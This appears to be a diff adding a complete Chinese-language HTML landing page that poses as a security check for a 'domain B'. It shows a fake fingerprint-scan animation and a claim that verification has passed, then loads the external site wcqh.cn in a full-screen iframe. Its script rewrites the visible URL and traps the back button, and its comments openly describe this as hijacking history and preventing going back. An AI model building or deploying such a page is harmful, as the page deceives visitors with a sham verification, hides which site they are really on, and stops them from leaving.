@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>安全验证中 - B域名</title>
+    <style>
+        /* 全屏遮罩层 */
+        #loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* 动态指纹验证动效 */
+        .fingerprint-scan {
+            width: 120px;
+            height: 120px;
+            position: relative;
+            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAiIGhlaWdodD0iMTIwIj48cGF0aCBkPSJNNTkgMTJjLTE4IDAtMzMgMTUtMzMgMzN2MjJoMTJWMjFjMC0xMiA5LTIxIDIxLTIxczIxIDkgMjEgMjF2MjRoMTJWMjFjMC0xOC0xNS0zMy0zMy0zM3oiIGZpbGw9IiMwN2MxNjAiLz48L3N2Zz4=') no-repeat center;
+        }
+
+        .scan-animation {
+            position: absolute;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(to right, transparent, #07c160, transparent);
+            animation: scan 2s infinite;
+        }
+
+        @keyframes scan {
+            0% { top: 0 }
+            100% { top: 100% }
+        }
+
+        /* 隐藏原始内容 */
+        #content-frame {
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <!-- 加载蒙层 -->
+    <div id="loader">
+        <div class="fingerprint-scan">
+            <div class="scan-animation"></div>
+        </div>
+        <p style="margin-top:20px;color:#666">安全验证通过，正在加载内容...</p>
+    </div>
+
+    <!-- 内容容器 -->
+    <iframe 
+        id="content-frame"
+        sandbox="allow-scripts allow-forms allow-same-origin"
+        style="width:100%;height:100vh;border:0"
+    ></iframe>
+
+    <script>
+        // 延迟加载策略
+        setTimeout(() => {
+            const frame = document.getElementById('content-frame');
+            
+            // 渐进式加载
+            frame.src = 'https://wcqh.cn/';
+            
+            // 模拟加载完成
+            frame.onload = () => {
+                document.getElementById('loader').style.display = 'none';
+                frame.style.opacity = 1;
+                
+                // 劫持历史记录
+                history.replaceState({}, '', '/');
+            };
+        }, 3000);
+
+        // 防止后退操作
+        window.addEventListener('popstate', (e) => {
+            history.pushState(null, null, window.location.href);
+        });
+
+        // 初始禁止操作
+        document.addEventListener('DOMContentLoaded', () => {
+            history.replaceState({}, '', '/');
+            history.pushState(null, null, window.location.href);
+        });
+    </script>
+</body>
+</html>
